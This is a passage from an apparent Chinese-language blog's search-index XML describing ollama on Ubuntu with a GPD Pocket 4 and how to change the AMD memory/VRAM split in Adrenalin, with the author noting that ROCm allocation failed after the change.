deepseek-r1:32b-qwen-distill-q4_K_M</span><br></pre></td></tr></table></figure>
<img src="/2025/02/16/2025-02-16/ollama_ubuntu.jpg" class="">

<h2 id="内存显存分配设置"><a href="#内存显存分配设置" class="headerlink" title="内存显存分配设置"></a>内存显存分配设置</h2><p>默认的48G&#x2F;16G的内存&#x2F;显存分配方案可以在Windows下更改，不过修改后Ubuntu下ollama container申请ROCm0设备内存时会失败，怀疑其是先加载到内存再加载到缓存的方案，没有AGX Orin那么灵活，所以还是保持默认方案分配吧。<br>这里记录一下具体修改显存分配的方法：</p>
<p>打开<strong>AMD Software: Adrenalin</strong>，在<strong>Performance</strong>-&gt;<strong>Tuning</strong>下，将<strong>Variable Graphics Memory</strong>改成High&#x2F;Custom自由调节，UMPC能给到48GB的VRAM也是夸张👀。</p>
<img src="/2025/02/16/2025-02-16/gpd_pocket4_vram.jpg" class="">

<style>p{text-indent:2em}</style>
]]></content>
      <categories>
        <category>tech</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>ubuntu</tag>
      </tags>
  </entry>
</search>
